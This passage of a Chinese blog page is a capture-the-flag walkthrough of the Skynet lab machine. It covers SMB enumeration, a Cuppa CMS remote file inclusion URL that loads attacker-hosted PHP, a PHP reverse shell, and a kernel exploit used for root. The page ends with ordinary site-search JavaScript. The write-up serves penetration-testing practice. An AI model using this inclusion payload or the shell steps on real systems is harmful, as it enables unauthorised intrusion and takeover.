+<p>这次咱们用 用户进去看看权限 403 页面登陆了还是禁止的<br>但是我们看到了三个邮件</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240628205742.png" alt="image.png"></p>
+<blockquote>
+<p>smb的密码改了跟我们在smb中获取的信息是一样的 强制修改了密码</p>
+</blockquote>
+<p>先看看smb 共享文件 milesdyson</p>
+<pre><code class="language-plaintext">Try &quot;help&quot; to get a list of possible commands.smb: \&gt; dir  .
+D
+0  Tue Sep 17 09:05:47 2019  ..
+D
+0  Wed Sep 18 03:51:03 2019  Improving Deep Neural Networks.pdf
+N  5743095  Tue Sep 17 09:05:14 2019  Natural Language Processing-Building Sequence Models.pdf
+N 12927230  Tue Sep 17 09:05:14 2019  Convolutional Neural Networks-CNN.pdf
+N 19655446  Tue Sep 17 09:05:14 2019  notes
+D
+0  Tue Sep 17 09:18:40 2019  Neural Networks and Deep Learning.pdf
+N  4304586  Tue Sep 17 09:05:14 2019  Structuring your Machine Learning Project.pdf
+N  3531427  Tue Sep 17 09:05:14 2019
+9204224 blocks of size 1024. 5653536 blocks availablesmb: \&gt;
+</code></pre>
+<p>全部dump 下来<br>得到很多pdf 和一个笔记<br>很好 import.txt 放着一个代办清单 在这里可以看到</p>
+<pre><code class="language-text">1. Add features to beta CMS /45kra24zxs28v3yd2. Work on T-800 Model 101 blueprints3. Spend more time with my wife
+</code></pre>
+<p>陪家人 之后要在CMS /45kra24zxs28v3yd 中开发功能<br>其他的看不懂 估计是跟这个神经网络有关 因此<br>还是先访问这个页面 感觉也没啥啊<br>太无语了<br>经过提示 ……. 没想到一个重要的一点<br>就是 我们看到他的清单 他第一个任务是想要去做一个cms 的功能点维护<br>这个时候我就应该想到 这就是个cms</p>
+<pre><code class="language-shell">cms cuppa扫描
+</code></pre>
+<h3>0x23 cuppacms</h3>
+<blockquote>
+<p>这个很快啊 直接就找到了一个nday 远程文件包含<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240628220759.png" alt="image.png"></p>
+</blockquote>
+<p>很舒服 而且看到后端是php<br>直接一句话木马 getshell 试试</p>
+<h3>0x30 Get_shell</h3>
+<blockquote>
+<p>还记得刚才的是一个 SquirrelMail version 1.4.23<br>找了一个rce但是一直连不上</p>
+</blockquote>
+<p>现在换成 cuppa cms 的 RFI</p>
+<pre><code class="language-txt">alerts/alertConfigField.php?urlConfig=http://10.11.69.232:8000/1.php
+</code></pre>
+<p>**exp</p>
+<pre><code class="language-shell">http://10.10.70.173/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.69.232/1.php
+</code></pre>
+<p>不知道为啥他好像不支持 bash 而且 nc也反弹不会来 蚁剑传一个php反向连接shell<br>只能这么做了 直接getshell</p>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240703162847.png" alt="image.png"></p>
+<h3>0x40Post</h3>
+<blockquote>
+<p>依旧是信息收集 先来信息收集</p>
+</blockquote>
+<pre><code class="language-shell">Linux version 4.8.0-58-generic (buildd
+@lgw01-21) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017
+</code></pre>
+<p>可以看到之前的判断没有错误确实是linux的ubuntu<br>其实运气挺好的 直接就发现一个内核的nday<br>直接就提权了 拿到shell</p>
+<p><a href="https://www.exploit-db.com/exploits/45010">内核nday 漏洞地址</a></p>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240703165323.png" alt="image.png"></p>
+<p>内核版本:</p>
+<pre><code class="language-c">4.4.0-31-generic4.4.0-62-generic4.4.0-81-generic4.4.0-116-generic4.8.0-58-generic4.10.0.42-generic4.13.0-21-generic
+</code></pre>
+<p>看了wp 之后发现另外一种方式</p>
+<p>tar 计划任务提权</p>
+<p>[[suid#tar of suid#]]</p>
+
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // Search Logic
+        const searchInput = document.getElementById('searchInput');
+        const searchResults = document.getElementById('searchResults');
+        
+        // Focus shortcut
+        document.addEventListener('keydown', (e) => {
+            if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+                e.preventDefault();
+                searchInput.focus();
+            }
+        });
+
+        let searchIndex = [];
+
+        // Load Index
+        fetch('/search.json')
+            .then(res => res.json())
+            .then(data => {
+                searchIndex = data;
+            });
+
+        searchInput.addEventListener('input', (e) => {
+            const query = e.target.value.toLowerCase();
+            if (query.length < 2) {
+                searchResults.style.display = 'none';
+                return;
+            }
+
+            const results = searchIndex.filter(item => 
+                item.title.toLowerCase().includes(query) || 
+                (item.content && item.content.toLowerCase().includes(query))
+            ).slice(0, 8); // Limit to 8
+
+            if (results.length > 0) {
+                searchResults.innerHTML = results.map(item => `
+                    <a href="${item.link}" class="search-result-item">
+                        <div class="search-result-title">📄 ${item.title}</div>
+                        <div class="search-result-meta">${item.date} · ${item.category}</div>
+                    </a>
+                `).join('');
+                searchResults.style.display = 'block';
+            } else {
+                searchResults.innerHTML = '<div style="padding:1rem;color:#9ca3af;text-align:center;">无搜索结果</div>';
+                searchResults.style.display = 'block';
+            }
+        });
+
+        // Close search on outside click
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.search-container')) {
+                searchResults.style.display = 'none';
+            }
+        });
+
+        // Sidebar Logic Enhanced
+        document.addEventListener('DOMContentLoaded', function() {
+            const currentPath = window.location.pathname;
+            
+            // 1. Highlight Active Link & Open Parent
+            const navLinks = document.querySelectorAll('.nav-item');
+            navLinks.forEach(link => {
+                let href = link.getAttribute('href');
+                // Normalize paths for comparison (remove trailing slashes, ignoring domain)
+                if (href && currentPath.indexOf(href) !== -1 && href !== '/') {
+                    link.classList.add('active');
+                    
+                    // Open all parents
+                    let parent = link.closest('details');
+                    while (parent) {
+                        parent.open = true;
+                        parent = parent.parentElement.closest('details');
+                    }
+                }
+            });
+
+            // 2. Preserve Sidebar Scroll Position
+            const sidebar = document.querySelector('.nav-group');
+            if (sidebar) {
+                const storedScroll = localStorage.getItem('sidebarScroll');
+                if (storedScroll) {
+                    sidebar.scrollTop = storedScroll;
+                }
+                
+                // Save scroll on click or before unload
+                window.addEventListener('beforeunload', () => {
+                    localStorage.setItem('sidebarScroll', sidebar.scrollTop);
+                });
+            }
+
+            // 3. User Experience: Keep manually opened folders open? 
+            // Optional: for now, the "Active Link" logic is usually enough for navigation.
+            // If user wants manual persistence, we need IDs for every details element.
+        });
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-cpp.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>
+</body>
+</html>
